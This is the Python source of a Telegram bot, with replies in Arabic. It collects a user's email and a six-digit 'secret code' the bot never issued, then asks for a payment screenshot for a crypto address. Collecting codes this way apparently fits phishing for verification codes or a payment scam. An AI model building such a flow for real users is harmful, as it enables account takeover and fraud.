import logging
import os
from aiogram import Bot, Dispatcher, executor, types
import psycopg2
from psycopg2 import sql
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv

load_dotenv()

API_TOKEN = os.getenv("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Connect to PostgreSQL
conn = psycopg2.connect(os.getenv("DATABASE_URL"), sslmode='require')
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id BIGINT PRIMARY KEY,
    email TEXT,
    code TEXT,
    payment_proof TEXT
);
""")
conn.commit()

# Start
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    await message.reply("✅ أهلا بك! أرسل بريدك الإلكتروني.")

# Email
@dp.message_handler(lambda message: '@' in message.text and '.' in message.text)
async def get_email(message: types.Message):
    user_id = message.from_user.id
    email = message.text
    cursor.execute("INSERT INTO users (user_id, email) VALUES (%s, %s) ON CONFLICT (user_id) DO UPDATE SET email = %s;", (user_id, email, email))
    conn.commit()
    await message.reply("📩 أرسل الآن الرمز السري.")

# Code
@dp.message_handler(lambda message: message.text.isdigit() and len(message.text) == 6)
async def get_code(message: types.Message):
    user_id = message.from_user.id
    code = message.text
    cursor.execute("UPDATE users SET code = %s WHERE user_id = %s;", (code, user_id))
    conn.commit()

    # Payment button
    markup = InlineKeyboardMarkup().add(
        InlineKeyboardButton("📥 نسخ العنوان", callback_data="copy_address")
    )
    await message.reply("✅ أرسل الآن إثبات الدفع (لقطة شاشة) بعد الدفع لـ:\n`TVjfzHeC4K7Q5u1uxxxxxxxxxxxx`", reply_markup=markup, parse_mode="Markdown")

# Payment proof
@dp.message_handler(content_types=types.ContentType.PHOTO)
async def get_screenshot(message: types.Message):
    user_id = message.from_user.id
    photo_id = message.photo[-1].file_id
    cursor.execute("UPDATE users SET payment_proof = %s WHERE user_id = %s;", (photo_id, user_id))
    conn.commit()
    await message.reply("📤 تم استلام الإثبات، سيتم التحقق يدويًا. شكرا!")

# Run
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
